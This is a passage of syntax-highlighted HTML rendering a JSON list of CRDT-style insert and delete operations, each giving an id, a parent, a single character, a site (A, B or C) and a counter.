</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;#&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 15
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:29&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;U&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 29
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:24&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;k&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 24
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:12&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;}&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 12
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:26&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:36&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;T&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 36
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:52&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:40&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:2&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 40
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;G&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 7
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:32&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:53&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:31&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:29&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:56&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;E&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 10
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:49&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;z&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 49
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:24&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:41&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:37&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 37
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;O&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 10
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;N&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 7
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:13&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:17&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;P&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 17
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:37&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:41&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 41
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:36&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;c&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 36
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:38&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:19&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:9&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 19
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:44&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;≈&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 44
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:54&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:35&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:49&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:29&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:41&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:17&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 17
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:16&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:54&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;H&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 54
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:37&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;i&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 37
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:33&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;l&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 33
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:56&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:10&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;≈&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 56
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:31&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 31
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:30&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 30
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:19&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:17&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:8&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;P&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 17
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:39&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;→&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 39
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:46&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;G&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 46
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:47&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;P&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 47
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:3&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;_&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 3
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:53&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;A:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;L&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 53
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:18&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:5&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;4&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;B&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 18
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:41&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:31&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:33&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;del&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:31&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;C:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;B:11&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;Y&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;C&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 11
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;A:7&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;parent&#34;: &#34;C:6&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ch&#34;: &#34;E&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;site&#34;: &#34;A&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;ctr&#34;: 7
</span></span></span><span class="line"><span class="cl"><span class="s2">  },
</span></span></span><span class="line"><span class="cl"><span class="s2">  {
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;op&#34;: &#34;ins&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;id&#34;: &#34;B:40&#34;,
